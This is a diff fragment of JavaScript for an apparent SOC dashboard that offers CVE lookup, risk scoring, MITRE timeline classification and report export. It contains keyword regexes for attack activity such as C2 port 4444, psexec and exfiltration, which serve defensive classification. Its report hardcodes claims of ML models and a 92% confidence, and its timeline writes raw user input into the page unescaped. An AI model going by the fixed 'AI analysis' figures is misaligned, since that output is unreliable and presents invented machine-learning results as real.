+    h+=`<span class="ky">Kill Chain Coverage </span>: <span class="ok">${Object.keys(tacticMap).length} tactics identified</span>`;
+  } else {
+    h+=`<span class="wa">No specific MITRE techniques matched.\nTry describing the attack: "phishing email with macro, then C2 beacon, then lateral movement via SMB"</span>`;
+  }
+  setO('a-mit-res',h);
+}
+
+function loadRecentCVEs(){
+  const cves=[
+    {id:'CVE-2021-44228',name:'Log4Shell',cvss:'10.0',affect:'Apache Log4j 2.x',desc:'JNDI injection via log messages — RCE without auth'},
+    {id:'CVE-2021-34527',name:'PrintNightmare',cvss:'8.8',affect:'Windows Print Spooler',desc:'RCE and LPE via spooler service — domain-wide impact'},
+    {id:'CVE-2022-30190',name:'Follina',cvss:'7.8',affect:'Microsoft MSDT',desc:'RCE via Office documents without macros'},
+    {id:'CVE-2023-23397',name:'Outlook NTLM Theft',cvss:'9.8',affect:'Microsoft Outlook',desc:'NTLM hash theft via calendar invite — no user interaction'},
+    {id:'CVE-2024-21887',name:'Ivanti CE',cvss:'9.1',affect:'Ivanti Connect Secure',desc:'Command injection in web components — actively exploited'},
+  ];
+  let h='<table><thead><tr><th>CVE ID</th><th>Name</th><th>CVSS</th><th>Affected</th><th>Summary</th></tr></thead><tbody>';
+  cves.forEach(c=>{
+    const cc=parseFloat(c.cvss)>=9?'tag-r':parseFloat(c.cvss)>=7?'tag-y':'tag-g';
+    h+=`<tr><td><span class="tag tag-p">${c.id}</span></td><td style="font-weight:600;color:var(--c3)">${c.name}</td><td><span class="tag ${cc}">${c.cvss}</span></td><td style="font-size:9.5px">${c.affect}</td><td style="font-size:9.5px;color:var(--muted)">${c.desc}</td></tr>`;
+  });
+  setO('a-cve-recent',h+'</tbody></table>');
+}
+
+async function aCVE(){
+  const val=document.getElementById('a-cve-in').value.trim();
+  if(!val){alert('Enter CVE ID or keyword');return;} incA(true,false);
+  setO('a-cve-res',sp());
+  const known={'CVE-2021-44228':{name:'Log4Shell',cvss:'10.0',affect:'Apache Log4j 2.x',tactic:'Initial Access',tech:'T1190',desc:'Remote code execution via JNDI injection in log messages. Affects Log4j 2.0-beta9 through 2.14.1. Actively exploited in the wild.',fix:'Upgrade to Log4j 2.17.1+'},'CVE-2021-34527':{name:'PrintNightmare',cvss:'8.8',affect:'Windows Print Spooler',tactic:'Privilege Escalation',tech:'T1547',desc:'RCE and local privilege escalation via Windows Print Spooler service. Can be used to install programs, create admin accounts.',fix:'Disable Print Spooler or apply MS patches'},'CVE-2022-30190':{name:'Follina',cvss:'7.8',affect:'Microsoft Office/MSDT',tactic:'Execution',tech:'T1203',desc:'Code execution via MSDT from a Word document. No macros required — just open the file.',fix:'Disable MSDT URL protocol, apply KB5014699'}};
+  const match=known[val.toUpperCase()]||Object.values(known).find(v=>v.name.toLowerCase().includes(val.toLowerCase()));
+  if(match){
+    let h=`<div style="background:var(--bg2);border:1px solid rgba(162,89,255,0.2);border-radius:3px;padding:13px;font-size:10.5px;line-height:2">`;
+    h+=`<span class="ky">CVE ID     </span>: <span class="tag tag-p">${val.toUpperCase()}</span>  <span class="c3" style="color:var(--c3)"> ${match.name}</span>\n`;
+    h+=`<span class="ky">CVSS Score </span>: <span class="${parseFloat(match.cvss)>=9?'er':'wa'}">${match.cvss} — ${parseFloat(match.cvss)>=9?'CRITICAL':parseFloat(match.cvss)>=7?'HIGH':'MEDIUM'}</span>\n`;
+    h+=`<span class="ky">Affected   </span>: <span class="in">${match.affect}</span>\n`;
+    h+=`<span class="ky">MITRE      </span>: <span class="tag tag-p">${match.tech}</span>  ${match.tactic}\n`;
+    h+=`<span class="ky">Description</span>: <span class="dv">${match.desc}</span>\n`;
+    h+=`<span class="ky">Fix        </span>: <span class="ok">${match.fix}</span>\n\n`;
+    h+=`<span class="ky">NVD        </span>: <span class="dv">→ https://nvd.nist.gov/vuln/detail/${val.toUpperCase()}</span>`;
+    h+='</div>';
+    setO('a-cve-res',h);
+  } else {
+    setO('a-cve-res',`<span class="wa">CVE not in local DB — check NVD directly:</span>\n<span class="in">https://nvd.nist.gov/vuln/search/results?query=${encodeURIComponent(val)}</span>`);
+  }
+}
+
+function aRiskScore(){
+  const soph=parseInt(document.getElementById('a-rs-soph').value)||3;
+  const asset=parseInt(document.getElementById('a-rs-asset').value)||3;
+  const exploit=parseInt(document.getElementById('a-rs-exploit').value)||5;
+  const ctrl=parseInt(document.getElementById('a-rs-ctrl').value)||4;
+  const cvss=parseFloat(document.getElementById('a-rs-cvss').value)||7.5;
+  const hits=parseInt(document.getElementById('a-rs-hits').value)||3;
+  incA(true,false);
+  const raw=(soph*0.2+asset*0.25+exploit*0.2+ctrl*0.15+cvss*0.15+(hits>10?10:hits)*0.05);
+  const score=Math.min(10,raw).toFixed(1);
+  const level=parseFloat(score)>=8?{l:'CRITICAL',c:'er',action:'Immediate response — escalate to CISO, initiate IR plan'}:parseFloat(score)>=6?{l:'HIGH',c:'er',action:'Priority response within 4 hours — patch/mitigate, alert team'}:parseFloat(score)>=4?{l:'MEDIUM',c:'wa',action:'Address within 48 hours — schedule patch window'}:{l:'LOW',c:'ok',action:'Monitor and patch in next maintenance window'};
+  let h=`<div style="background:var(--bg2);border:1px solid rgba(162,89,255,0.2);border-radius:3px;padding:14px;font-size:10.5px;line-height:2">`;
+  h+=`<span class="ky">AI Risk Score    </span>: <span class="${level.c}" style="font-size:20px;font-weight:900">${score}/10</span>\n`;
+  h+=`<span class="ky">Risk Level       </span>: <span class="${level.c}">${level.l}</span>\n\n`;
+  h+=`<span class="ky">Attack Sophist.  </span>: ${soph}/10\n`;
+  h+=`<span class="ky">Asset Value      </span>: ${asset}/10\n`;
+  h+=`<span class="ky">Exploit Avail.   </span>: ${exploit}/10\n`;
+  h+=`<span class="ky">Control Gap      </span>: ${ctrl}/10\n`;
+  h+=`<span class="ky">CVSSv3           </span>: ${cvss}\n`;
+  h+=`<span class="ky">Threat Intel Hits</span>: ${hits}\n\n`;
+  h+=`<span class="ky">Required Action  </span>: <span class="wa">${level.action}</span>`;
+  h+='</div>';
+  setO('a-rs-res',h);
+  if(parseFloat(score)>=6)incA(false,true);
+}
+
+function aTimeline(){
+  const input=document.getElementById('a-tl-in').value.trim();
+  if(!input){alert('Paste events');return;} incA(true,false);
+  const lines=input.split('\n').filter(Boolean);
+  const phaseMap=[
+    {phase:'Reconnaissance',keys:/recon|scan|osint|phish|email|survey/i,id:'TA0043',color:'tag-c'},
+    {phase:'Initial Access',keys:/macro|exploit|attach|open|click|login|cred/i,id:'TA0001',color:'tag-y'},
+    {phase:'Execution',keys:/exec|run|payload|script|drop|download|shell/i,id:'TA0002',color:'tag-y'},
+    {phase:'Persistence',keys:/persist|cron|startup|registry|service|autorun/i,id:'TA0003',color:'tag-y'},
+    {phase:'C2',keys:/beacon|c2|connect|tunnel|4444|callhome/i,id:'TA0011',color:'tag-r'},
+    {phase:'Lateral Movement',keys:/lateral|smb|rdp|pivot|spread|psexec/i,id:'TA0008',color:'tag-r'},
+    {phase:'Exfiltration',keys:/exfil|upload|transfer|steal|dns.+tunnel/i,id:'TA0010',color:'tag-r'},
+  ];
+  let h=`<span class="ok">ATTACK TIMELINE</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+='<table><thead><tr><th>#</th><th>Event</th><th>Phase</th><th>MITRE</th></tr></thead><tbody>';
+  lines.forEach((line,i)=>{
+    const phase=phaseMap.find(p=>p.keys.test(line))||{phase:'Unknown',id:'—',color:'tag-b'};
+    h+=`<tr><td style="color:var(--muted)">${i+1}</td><td style="font-size:10px;max-width:250px">${line.substring(0,80)}</td><td><span class="tag ${phase.color}">${phase.phase}</span></td><td><span class="tag tag-p">${phase.id}</span></td></tr>`;
+  });
+  h+='</tbody></table>';
+  setO('a-tl-res',h);
+}
+
+let aiReportText='';
+function aGenReport(){
+  const analyst=document.getElementById('ar-analyst').value||'SOC Analyst';
+  const inc=document.getElementById('ar-inc').value||'INC-2025-001';
+  const sev=document.getElementById('ar-sev').value;
+  const type=document.getElementById('ar-type').value;
+  const findings=document.getElementById('ar-findings').value||'No findings provided.';
+  const mitreTech=ATTACK_SIGS.find(s=>s.re.test(findings+' '+type));
+  aiReportText=`====================================\n   AI THREATGUARD — SOC THREAT REPORT\n====================================\nGenerated: ${new Date().toISOString()}\nModel: ML Ensemble v2.1 (RF+LSTM+NLP)\n\nINCIDENT INFORMATION\n------------------------------------\nAnalyst      : ${analyst}\nIncident ID  : ${inc}\nSeverity     : ${sev}\nAttack Type  : ${type}\n${mitreTech?'MITRE ATT&CK : '+mitreTech.id+' — '+mitreTech.tactic+'\n':''}\nAI ANALYSIS\n------------------------------------\nRisk Score   : ${sev==='CRITICAL'?'9.2':sev==='HIGH'?'7.5':sev==='MEDIUM'?'5.5':'3.0'}/10\nML Confidence: 92%\nModels Used  : Random Forest, LSTM, BERT-NLP\n\nFINDINGS & IOCs\n------------------------------------\n${findings}\n\nRECOMMENDATIONS\n------------------------------------\n1. Isolate affected systems immediately\n2. Preserve forensic evidence\n3. Notify relevant stakeholders per IR plan\n4. Patch/mitigate identified vulnerabilities\n5. Monitor for re-infection or persistence\n\nSTATISTICS\n------------------------------------\nInputs Scanned  : ${aS}\nThreats Detected: ${aT}\n====================================\nEND OF REPORT\n====================================`;
+  setO('ar-preview',`<div class="out">${aiReportText.replace(/</g,'&lt;').replace(/\n/g,'<br>')}</div>`);
+  incA(true,false);
+}
+function aExportReport(){if(!aiReportText)aGenReport();const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([aiReportText],{type:'text/plain'}));a.download=`ai_threat_report_${Date.now()}.txt`;a.click();}
+</script>
+</body>
+</html>
